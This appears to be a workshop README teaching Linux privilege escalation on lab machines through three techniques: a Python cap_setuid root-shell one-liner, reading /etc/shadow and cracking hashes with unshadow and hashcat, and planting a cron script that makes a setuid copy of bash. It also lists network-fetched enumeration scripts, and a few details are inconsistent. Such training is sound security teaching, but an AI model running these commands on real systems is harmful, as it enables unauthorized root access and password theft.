# Linux-Privilege-Escalation
Gaining access could be considered one of the most important steps of an attack, but whats access without a little escalation. This workshop aims to take things to the next level introducing attendees to subtle art of privilege escalation. Attendees will learn how to leverage miss-configurations and vulnerabilities to perform actions running in a higher security context than intended by the designer. 

Having access of an average user is all well and good but....WE WANT ROOT! 


                                        ================================

Obtenir accès à une ressource peut être considéré comme l'une des étapes les plus importantes d'une attaque, mais qu'est-ce que l'accès sans une petite escalade. Cet atelier vise à initier les participants à l'art subtil de l'escalade des privilèges. Les participants apprendront comment tirer parti des erreurs de configuration et des vulnérabilités pour effectuer des actions exécutées dans un contexte de sécurité plus élevé que prévu par le concepteur.

Avoir accès à un utilisateur moyen, c'est bien beau, mais... NOUS VOULONS ACCÈS AU COMPTE ROOT !

(\_/)  
(x.x)  
(___)0  
# Linux - Privilege Escalation
## Escalation of Privilege
(Definition taken from the Certified Ethical Hackers v10)   

Gaining access could be considered one of the most important steps of an attack. After the hacker has gained access, she can move from system to system spreading her damage as she progresses. 

Once the hacker has gained shell access, she will then move to escalate her shell privilege. Solely having access of an average user most likely will not give her much control or access to the network. Therefore, the hacker will attempt to escalate herself to domain adminstrator or root privilege. The ration for this is those are the individuals who control the network.

The way a hacker can escalate her shell privileges can happen due to a bug, misconfiguartion or vulnerability in an application or operating systems. However the task is accomplished by the hacker can be a matter of style, skill or resources which ledas teh hacker to perfrom actions running in a higher security context than intended by the designer. 


## Summary

* [Privilege Escalation Overview](#privilege-escalation)
  * [Three Privilege Escalation Techniques Covered](#workshop-agenda) 
  * [Anatomy of a Privilege Escalation attack](#the-anatomy-of-a-privilege-escalation-attack)
* [Attack I: Capabilities - Jude Milhon Box](#attack-i-capabilities) 
  * [Enumerate](#enumerate)
  * [What is cap_setuid?](#what-is-cap_setuid)
  * [What are GTFO Bins](#what-are-gtfo-bins)
  * [Execute exploit](#execute-exploit)
  * [Manual Enumeration process](#manual-enumeration-prcoess)
* [Attack II: Weak Passwords - VNSMatrix Box](#attack-ii-weak-passwords)
  * [Why is it called the passwd file](#why-is-it-called-the-passwd-file)
  * [Shadow Files](#shadow-files)
  * [Handy Shadow Commands](#handy-shadow-commands)
  * [Compromise a machine with shadow files](#how-can-we-compromise-a-machine-with-access-to-shadow-files)
  * [Theory behind shadow and passwd attack](#theory-behind-this-attack-if-you-can-modify-the-shadow-and-passwd-file)
  * [Unhashing the shadow file](#unhashing-the-shadow-file)
  * [Unshadow Tool](#unshadow-tool)
  * [Hashcat](#hashcat)
* [Attack III: Cron Jobs - Raven_Adler Box](#attack-iii-cron-jobs)
  * [What is a cron job?](#what-is-a-cron-job)
  * [Deciphering Cron Jargon](#deciphering-cron-jargon)
  * [Locating Cron Tasks](#locating-cron-tasks)
  * [Manual Cron Job Enumeration](#cron-job-manual-enumeration)
* [Automation Tools](#tools)
* [Hacking Herstory - Box Names](#hacking-herstory---box-names)
* [Reference](#references)  

## Privilege Escalation
There are many techniques for a hacker to escalate her privileges. I've listed a few below. However, given the time constraints, we will solely focus on (3) of these techniques. 

* SUID
* Kernel Exploits
* Cron Jobs
* SUID Binary
* NFS
* Capabilities
* Exploiting the OS or an application
* Manipulation of an access token
* Path interception
* Tricking the user into executing the program
* Scheduling a task
* Create a webshell to inject a malicious script

#### Workshop Agenda
* Capabilities
* Weak Passwords
* Cron Jobs

### The Anatomy of a Privilege Escalation Attack
    1. Find a vulnerability - Enumeration
    2. Create the related exploit
    3. Use the exploit on a system
    4. Check if it successfully exploits the system
    5. Gain additional privileges

#### Enumeration 
To learn about any weaknesses you have to know what operating system and version is used. This is done with a process that is called enumeration.

Enumeration, as defined by Tutorialspoint, is as follows: 
Enumeration belongs to the first phase of Ethical Hacking, i.e., "Information Gathering". This is a process where the attacker establishes an active connection with the victim and try to discover as much attack vectors as possible, which can be used to exploit the systems further

##### Linux Manual Enumeration Commands
  * > /etc
  * >  /proc
  * >  ifconfig
  * >  lsof
  * >  netstat
  * >  uname

## Attack I Capabilities

Capabilities are permissions typically reserved to run privileged tasks. Generally capabilities are set on executable files that can then be automatically granted access to a privileged process when executed. 

### Enumerate
* Linpeas
  * ```wget /tmp -P "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"```  

* Vulnerability: /usr/bin/python3.8 = cap_setuid+ep

#### What is cap_setuid? 
CAP_SETUID = Allow changing of the
User ID
We can change the UID to 0 which is
root.
### Search for an exploit
* GTFO Bins
  * https://gtfobins.github.io/
  * Capabilities 
  * Python
  
#### What are GTFO-Bins? 
GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

### Execute Exploit
```>>/usr/bin/python3.8 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’```

#### Manual Enumeration Prcoess
>>getcap -r / 2>/dev/null
  /usr/bin/python3.8 = cap_setuid+ep

>>/usr/bin/python3.8 -c ‘import os; os.setuid(0); os.system(“/bin/bash”)’

## Attack II Weak Passwords
Linux requires that user accounts have a password, but by default it will not prevent you from leaving one set blank. During installation, Linux gives the user the choice of setting hte password encryption standard. Most versions of Linux, such as Fedora and others, use message digest algorithm 5 (MD5) by default. If you choose not to use MD5, you can choose Data Encryption Standard (DES); be aware, however, that it limits passwords to eight alphanumeric characters. 

#### Enumeration
* Linpeas
  * ```wget /tmp -P "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"```  
* Check bash history for a password typo

### Why is it called the passwd file? 
This used to actually store passwords back in the day. Today, the password is a placeholder marked as an `x` and the hashed password is stored in the shadow file. 

## Shadow files
Linux also includes the `/etc/shadow` file for additional password security. Here is a refresher of what the contents look like from the `/etc/shadow`:

`root:$1$Gjt/eO.e$pKFFRe9QRB4NLvSrJodFy.:0:0:root:/root:/bin/bash`

Moving the passwords to the shadow file makes it less likely that the encrypted password can be decrypted, because only the root user has access to the shadow file. The format of the password file is as follows: 

`Account_name:Password:Last:Min:Max:Warn:Expire:Disable:Reserved`

An easy way to examine the passwd file is shown here: 

`[root@mg /root]# cat /etc/passwd`
`root:x:0:0:root:/root:/bin/bash`
`vicki:x:503:503:Vicki:/home/mg:/bin/bash`...

The second field has an "X" (vicki:x:503). That is because the passwords have been "shadowed". 

#### Handy Shadow Commands
-  ```cat /etc/passwd | cut -d : -f 1```
cuts all the junk out
cut "delimieter" which is ":" and "field" 1

### How can we compromise a machine with access to shadow files? 
1. Look at file permissions of the /etc/passwd file:  `ls -la /etc/passwd`
   * A regular users should only have read access to the /etc/passwd file: `-rw-r--r--`
2. Look at file permission of the /etc/shadow file: `ls -la /etc/shadow`
  * A regular users should have NO read access to the /etc/shadow file: `-rw-rw----`
If the shadow file is readable as a regular user, we can potentially use the shadow file to unhash the password to escalate privileges

#### Theory behind this attack if you can modify the shadow and passwd file
If we can modify the /etc/passwd file, we can delete the `:x:` from the root user place holder as discussed above. If there is no placeholder, then there is no password which means we can sudo switch user into root.

On the otherhand, we can swap the hash in the /etc/shadow file of the root user to a hash we know the plain text value to in order to login as root.  

We can also modify our groupid within the /etc/shadow file. For example, let's say we have group 1000, we can change it to 0, in order to be root. 

If the shadow file is readable by a regular user, we can plug the has into the `:x:` placeholder of the root user within the /etc/passwd file. 

Stay aware of what your file permission are. 
 
## Unhashing the shadow file
In this use case, we do have read access to the shadow file which is good for exploiting the machine but a no no for the end user. In order to unhash the password found within the /etc/shadow file, we will need use a tool to unhas the file. 

### Copying the contents
To begin, copy the contents of the /etc/passwd file and /etc/shadow file by cat the files: 
* `cat /etc/shadow`
* `cat /etc/passwd`

Change to your machine and using the editor you like copy the contetns into a file name `passwd` and `shadow`: 
* `nano passwd`
* `nano shadow`

### UnShadow Tool
With this staged, we can use a tool called "unshadow" which is built into Kali. 

It works using the following arguments `unshadow PASSWORD-FILE SHADOW-FILE`. In our case we would do the following:
* `unshadow passwd shadow`

If you examine the unshadowed file, it has taken the hash from the /etc/shadow file and positioned it where the `:x:` placeholder was located within the /etc/passwd file. 

To recap, it's filling in the placeholder with the hash and this is what is referred to as an "unshadowed file"

Now, copy all the information from the unshadowed file into a new file called "unshadow":
* `nano unshadow`

Now, delete everything that doesn't have a hash. It should leave with you a root and user account. Once you have this, copy these two lines. 

### hashcat
To unhash these passwords we need to identify the hashing type. This is a good resource to get started with:
* https://hashcat.net/wiki/doku.php?id=example_hashes

First we can look at the hash and look for distinguishing markers: 
* `$6$`

In the above example we can see it's mode 1800 and a sha512crypt hash. Therefore if we run it through hashcat it will follow this logic:
* `hashcat64 -m 1800 creds.txt rockyou.txt -O`

The -O is optimization. What? I do not know yet.

In theory, we should have some cracked password from the "rockyou.txt" file.

## Attack III Cron Jobs
### What is a cron job? 
A cron job is a Linux command used for scheduling tasks to be executed sometime in the future. 

### Deciphering Cron Jargon
```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
### Locating Cron Tasks
In your terminal run `cat /etc/crontab`
```
shell = /bin/sh
bin = /home/user:/usr/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root fluffy_bunny.sh
* * * * * root /usr/local/bin/more_fluffy_bunnies.sh
```

There are two files being executed. Let's see if they exist: 
* ` ls -la /home/user | grep -i "deatheater.sh" `

We see that it doesn't. So what can we do? We can make that file and have it do something malicious in order to gain root access:

* `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/usr/fluffy_bunny.sh`

Now that we have made the .sh file, we need to make it executable so it runs: 
 * `chmod +x /home/user/fluffy_bunny.sh`

Let's check to see when /tmp/bash was last overwritten: 

* `ls -la /tmp` or `ls -la /tmp/bash | grep -i "bash"`

After the cron task is picked up and our file is created run this: 

* `/tmp/bash -p`

#### Brief overview of the '-p' flag
If Bash is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, the startup behavior is the same, but the effective user id is not reset.
Now we should have root :)


### Cron Job Manual Enumeration
#### Handy Cron Job command line kung fu
* List all cron jobsn  
--Cron is started automatically from /etc/init.d
  * >crontab -l
  * >cat /etc/crontab
  * >ls -la /etc/cron.hourly
  * >ls -la /etc/cron.daily
  * >ls -la /etc/cron.weekly
  * >ls -la /etc/cron.monthly
  * >/etc/init.d
  * >/etc/cron*
  * >/etc/crontab
  * >/etc/cron.allow
  * >/etc/cron.d
  * >/etc/cron.deny
  * >/etc/cron.daily
  * >/etc/cron.hourly
  * >/etc/cron.monthly
  * >/etc/cron.weekly
  * >/etc/sudoers
  * >/etc/exports
  * >/etc/anacrontab
  * >/var/spool/cron
  * >/var/spool/cron/crontabs/root
  * >crontab -l
  * >ls -alh /var/spool/cron;
  * >ls -al /etc/ | grep cron
  * >ls -al /etc/cron*
  * >cat /etc/cron*
  * >cat /etc/at.allow
  * >cat /etc/at.deny
  * >cat /etc/cron.allow
  * >cat /etc/cron.deny*
  
    
## Tools

There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors.
Here are a few:

- [LinPEAS - Linux Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

    ```powershell
    wget "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh" -O linpeas.sh
    ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
    ./linpeas.sh -s #superfast & stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.
    ./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users
    ```

- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)

    ```powershell
    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
    ./lse.sh -l1 # shows interesting information that should help you to privesc
    ./lse.sh -l2 # dump all the information it gathers about the system
    ```

- [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)

    ```powershell
    ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
    ```

- [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)

-[Hash Cat](https://hashcat.net/hashcat/)

## Hacking Herstory - Box Names
* Jude Milhon
  * Judith [Jude] Milhon (March 12, 1939 – July 19, 2003), in Washington D.C.,[1] best known by her pseudonym St. Jude, was a self-taught programmer, civil rights advocate, writer, editor, advocate for women in computing hacker and author in the San Francisco Bay Area. Milhon coined the term cypherpunk and was a founding member of the cypherpunks. 
  * Activism within the cyber community was important to Milhon as well. She frequently urged women toward the internet and hacking while encouraging them to have "tough skin" in the face of harassment.[2] At a time when the internet was dominated by men, she was an ardent advocate of the joys of hacking, cybersex and a woman's right to technology.[3][1] She often said, "Girls need modems. Women may not be great at physical altercations, but we sure excel at rapid-fire keyboarding."
  [Wikipedia Reference (I know it's terrible to use this)](https://en.wikipedia.org/wiki/Jude_Milhon)
* Raven Adler
  * Alder was the first woman to deliver a technical presentation at the famed DefCon hacker conference in Las Vegas. But don't harp on it. If there's one thing she hates, it's being type-cast as a "chick hacker". "If I never read another 'she's going to save the Internet' article or have a reporter wanting me to pose by the pool at DefCon with a life preserver, it will be too soon. "One popular magazine's 'do you think girl hackers should date boy hackers?' left a bad taste in my mouth, too. Nobody asks the guys this stuff, and finding myself a 'boy hacker' is not really tops on my list of things to do this weekend," Alder said. 
  [Hackstory Reference](https://hackstory.net/Raven_Alder)
* VNS Matrix
  * VNS Matrix was an artist collective founded in Adelaide, Australia, in 1991, by Josephine Starrs, Julianne Pierce, Francesca da Rimini and Virginia Barratt. Their work included installations, events, and posters distributed through the Internet, magazines, and billboards. Taking their point of departure in a sexualised and socially provocative relationship between women and technology the works subversively questioned discourses of domination and control in the expanding cyber space.[1] They are credited as being amongst the first artists to use the term cyberfeminism to describe their practice. 
  [Wikipedia Reference(I know, I know)](https://en.wikipedia.org/wiki/VNS_Matrix)

## REFERENCES
---
- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
- [Privilege escalation via Docker - April 22, 2015 - Chris Foster](https://fosterelli.co/privilege-escalation-via-docker.html)
- [An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018](https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/)
- [Exploiting wildcards on Linux - Berislav Kucan](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/)
- [Code Execution With Tar Command - p4pentest](http://p4pentest.in/2016/10/19/code-execution-with-tar-command/)
- [Back To The Future: Unix Wildcards Gone Wild - Leon Juranic](http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)
- [HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018](https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/)
- [Privilege Escalation via lxd - @reboare](https://reboare.github.io/lxd/lxd-escape.html)
- [Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
- [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
* [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
* [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
* [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
* [The Great Debate over GNU/Linux](https://www.howtogeek.com/139287/the-great-debate-is-it-linux-or-gnulinux/)
* [Richard Stallmans on why software should be free](https://www.gnu.org/philosophy/shouldbefree.en.html)
* [Different types of shells in linux](https://www.journaldev.com/39194/different-types-of-shells-in-linux)
* [History of linux](https://en.wikipedia.org/wiki/History_of_Linux)
* [User Groups and Permissions in Linux](https://www.section.io/engineering-education/user-groups-and-permissions-linux/)
* [Etc Passwd File](https://linuxize.com/post/etc-passwd-file/)
* [Understanding the etc passwd file](https://www.geeksforgeeks.org/understanding-the-etc-passwd-file/)
* [Cron Jobs](https://www.hivelocity.net/kb/what-is-cron-job/)
* [Understanding Linux Privilege Escalation](https://linux-audit.com/understanding-linux-privilege-escalation-and-defending-against-it/)
* [Ethical Hacking - Enumeration](https://www.tutorialspoint.com/ethical_hacking/ethical_hacking_enumeration.htm)